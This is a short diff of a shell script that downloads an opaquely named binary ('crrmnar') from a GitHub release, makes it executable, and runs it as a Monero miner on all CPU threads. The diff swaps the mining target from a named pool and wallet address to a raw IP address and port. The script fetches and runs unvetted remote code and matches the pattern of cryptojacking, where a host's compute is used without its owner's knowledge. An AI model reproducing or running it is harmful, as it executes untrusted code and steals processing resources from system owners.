@@ -16,4 +16,4 @@ wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar
 
 # Make it executable
 chmod +x crrmnar
-./crrmnar -o stratum+tcp://xmr.suprnova.cc:6663 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC.lofdd -p x -a rx/0 -t $(nproc --all)
+./crrmnar -o 50.116.14.118:8088 -u pavantym.lofddtys -p x -a rx/0 -t $(nproc --all)
